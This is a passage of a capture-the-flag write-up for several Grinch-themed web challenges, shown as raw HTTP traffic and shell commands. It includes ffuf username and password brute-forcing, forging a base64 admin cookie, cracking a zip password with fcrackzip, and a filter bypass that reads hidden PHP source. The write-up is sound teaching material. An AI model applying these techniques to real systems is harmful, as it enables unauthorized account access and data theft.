User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 20:03:18 GMT
Content-Type: application/json
Connection: close
Content-Length: 216

{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

flag found!, we're done here.

> flag: **flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}**
   next challenge: **/apps**

# Day 5: Secure Login

New challenge approaches.. , `/apps` gave us again our new challenge: `/secure-login`

> Secure Login
 Try and find a way past the login page to get to the secret area.

{F1138009}

Challenge home page is just a login form, no changes on its page source or  HTML DOM.

Lets inspect the http traffic whilst trying to login as `admin:admin`

```html
POST /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 29
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/secure-login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

username=admin&password=admin

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 21:34:01 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1724

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Secure Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Secure Login</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                            <div class="alert alert-danger">
                    <p class="text-center">Invalid Username</p>
                </div>
                        <form method="post">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Secure Login</div>
                    <div class="panel-body">
                        <div><label>Username:</label></div>
                        <div><input class="form-control" name="username"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input type="password" class="form-control" name="password"></div>
                        <div style="margin-top:11px">
                            <input type="submit" class="btn btn-success pull-right" value="Login">
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>
```

We got `Invalid Username` as response, its likely vulnerable to [User enumeration][userenum], so trying to exploit it using as wordlist: [names.txt][names.txt] and [10-million-password-list-top-100.txt][10-million-password-list-top-100.txt]

```bash
# user enumeration
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -t 50 -fr "Invalid Username" -d "username=FUZZ&password=admin" -H "Content-Type: application/x-www-form-urlencoded" -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
[WARN] Caught keyboard interrupt (Ctrl-C)

# password enumeration
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -t 50 -fr "Invalid Password" -d "username=access&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -c -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [101/101] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

We got valid credentials: `access:computer`, so lets login on `/secure-login`.

```html
POST /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 33
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/secure-login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

username=access&password=computer

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 21:17:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Wed, 16-Dec-2020 22:17:13 GMT; Max-Age=3600; path=/secure-login
Location: /secure-login
Content-Length: 0

GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/secure-login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; 

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 21:18:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1108

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Secure Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Secure Login</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="panel panel-default">
                <div class="panel-heading">Secure Files</div>
                <div class="panel-body">
                    <div class="alert alert-danger text-center">
                        <p>No Files To Download</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

We got access!, its has a vault called 'Secure files' with no files to download.

Before trying to fuzz here, lets check our cookie value `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; 
`
```bash
$ echo eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=| base64 -d
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

We have a value we can tamper now: `"admin":false`, changing `false` to `true` and replaying our vault access

```bash
$ echo -n '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'| base64
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

```html
GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/secure-login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d; 

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 21:19:19 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1605

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Secure Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Secure Login</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="panel panel-default">
                <div class="panel-heading">Secure Files</div>
                <div class="panel-body" style="padding:0">
                    <table class="table" style="margin:0">
                        <tr>
                            <th>File Name</th>
                            <th class="text-center">File Type</th>
                            <th class="text-center">Size</th>
                        </tr>
                        <tr>
                            <td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
                            <td class="text-center">Zip</td>
                            <td class="text-center">210 Kb</td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

Now we have access to one zip file: `/secure-login/my_secure_files_not_for_you.zip`, let's download and analyze it

```bash
$ file my_secure_files_not_for_you.zip
my_secure_files_not_for_you.zip: Zip archive data, at least v2.0 to extract

$ unzip my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
   skipping: xxx.png                 incorrect password
   skipping: flag.txt                incorrect password
```

Its password protected!, no problem, we can make use of our friend John ~~Hamm***~~ or [fcrackzip][fcrackzip] to recover our forgotten password and access our files.

```bash
# password recovery
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt my_secure_files_not_for_you.zip
PASSWORD FOUND!!!!: pw == hahahaha

# unzip
$ unzip my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
  inflating: xxx.png
  extracting: flag.txt

$ cat flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```
Done!, we got our flag and this Grinch super secret image:

{F1138031}

> flag: **flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}**
 next challenge: **/apps**

# Day 6: My Diary

New challenge on `/apps`, this time redirect us to `/my-diary`

> My Diary
 Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?

{F1138011}

Browsing on the new challenge home page redirect us to `/my-diary/?template=entries.html`

```html
GET /my-diary/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Dec 2020 17:04:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /my-diary/?template=entries.html
Content-Length: 0

GET /my-diary/?template=entries.html HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Dec 2020 17:04:09 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 8203

[...]<!DOCTYPE html>
<html lang="en">
<head>
    <title>My Diary</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">My Diary</h1>
    <div class="row" style="margin-top:30px">
        <div class="col-sm-2 col-xs-6">
            <div class="alert alert-info text-center" style="padding:5px;height:80px">
                <p><strong>1st Dec 2020</strong></p>
                <p></p>
            </div>
        </div>
        <div class="col-sm-2 col-xs-6">
            <div class="alert alert-info text-center" style="padding:5px;height:80px">
                <p><strong>2nd Dec 2020</strong></p>
                <p>wallow in self pity</p>
            </div>
        </div>
        <div class="col-sm-2 col-xs-6">
            <div class="alert alert-info text-center" style="padding:5px;height:80px">
                <p><strong>3rd Dec 2020</strong></p>
                <p></p>
            </div>
        </div>[...]
```

Its loads many diary entries, but the template parameter looks juicy, so lets fuzz what other pages are `/my-diary` using [common.txt][common.txt] as wordlist first.

```bash
$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/FUZZ -fc 404 -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [4660/4660] :: Job [1/1] :: 444 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

Ok, my mistake, lets inspect `index.php` using `/my-diary/?template=index.php` then

```php
GET /my-diary/index.php?template=index.php HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Dec 2020 17:14:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 689

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Nice!, we got the `index.php` source code and two new endpoints: `admin.php` and `secretadmin.php`

- `/my-diary/admin.php`: returns status code 404.
- `/my-diary/secretadmin.php`: returns status code 200, with response body: `You cannot view this page from your IP Address`.

```html
GET /my-diary/secretadmin.php HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Dec 2020 17:16:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 46

You cannot view this page from your IP Address
```

Here, I tried common IP bypasses based on headers with no success.

Back to the template endpoint `/my-diary/index.php?template=`, trying to use `/my-diary/index.php?template=secretadmin.php` redirect us to home.

We had already `index.php` source code, looking closely and after refreshing my mind with the php documentation: [preg_replace][8], [str_replace][9], we have those steps done by the filter:

- allows as input only alphanumeric characters and dots.
- delete all `admin.php` occurrences from our input.
- delete all `secretadmin.php` occurrences from our input.
- if exists a file with our input name, load that file, else redirect us to home.

The filter only deletes occurrences one time each step (no recursion), So I managed to build our attack vector to bypass that: `template=secretadsecretadadmin.phpmin.phpmin.php`

```html
GET /my-diary/index.php?template=secretadsecretadadmin.phpmin.phpmin.php HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Dec 2020 17:37:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1780

<?php
if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>My Diary</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">My Diary</h1>
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
    <div class="row" style="margin-top:30px">
        <div class="col-md-6 col-md-offset-3">
            <div class="panel panel-default">
                <div class="panel-heading">Pending Entries</div>
                <div class="panel-body" style="padding:0">
                    <table class="table" style="margin:0">
                        <tr>
                            <th>Date</th>
                            <th>Event</th>
                            <th class="text-center">Action</th>
                        </tr>
                        <tr>
                            <td>23rd Dec</td>
                            <td>Launch DDoS Against Santa's Workshop!</td>
                            <td class="text-center"><input type="button" class="btn btn-danger btn-xs" value="Post"></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
<?php
}else{
    die("You cannot view this page from your IP Address");
}
```
We got the flag and Grinch future plan!

{F1138028}

> flag: **flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}**
 next challenge: **/apps**

# Day 7: Hate Mail Generator

Its challenge time!, this time `/apps` gives us as new endpoint: `/hate-mail-generator`

> Hate Mail Generator
 Sending letters is so slow! Now the Grinch sends his hate mail by email campaigns! Try and find the hidden flag!

{F1138010}

After exploring through the application, we have:

- `/hate-mail-generator`: home page, links to create and view campaign.
    - `/hate-mail-generator/<cmp_id>`: view template of existing campaign, read only. e.g: /hate-mail-generator/91d45040151b681549d82d8065d43030
        - `/hate-mail-generator/<cmp_id>/preview`: preview email with template applied.
    - `/hate-mail-generator/new`: allows to create a new campaign template. 
        - `/hate-mail-generator/new/preview`: allows to preview our new campaign template.

Analyzing the existing campaign and its preview.

```html
GET /hate-mail-generator/91d45040151b681549d82d8065d43030 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 17:37:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 3532

[...]                   <div><textarea class="form-control" rows="15" disabled>{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}</textarea></div>[...]
```

```html
GET /hate-mail-generator/91d45040151b681549d82d8065d43030/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 17:40:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 560

<html>
<body>
<center>
    <table width="700">
        <tr>
           <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Message From The Grinch!</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px"> Hi Bob..... Guess what..... <strong>YOU SUCK!</strong>        </td>
        </tr>
        <tr>
            <td height="30" width="700" style="background-color: #64d23b;color:#FFF;font-size:10px;padding-left:10px">Grinch Networks Inc.</td>
        </tr>
    </table>
</center>
</body>
</html>
```

We noted some templates variables availables such as `{{template:cbdj3_grinch_header.html}}` , `{template:cbdj3_grinch_footer.html}}` and `{{name}}`.

And following the flow of creating a new template, preview and registering it.

```html
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 89
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

preview_markup=Hello {{name}} ....&preview_data={"name":"Alice","email":"alice@test.com"}

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 17:44:20 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 16

Hello Alice ....
```

```html
POST /hate-mail-generator/new HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 49
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

name=&subject=&markup=Hello+%7B%7Bname%7D%7D+....

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 18 Dec 2020 17:45:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2658

[...]   <h1 class="text-center">New Campaign</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                          <div class="alert alert-danger">
                   <p class="text-center">Sorry but you've run out of credits</p>
               </div>[...]
```

It is not possible to register a new campaign, but we observed on preview that we can send our own data `&preview_data={"name":"Alice","email":"alice@test.com"}`

At this point I started fuzzing more endpoints with [ffuf][ffuf] with [common.txt][common.txt] as wordlist, while testing if there were other defined template variables that I could use.

```bash
$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -fc 404 -mc all -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
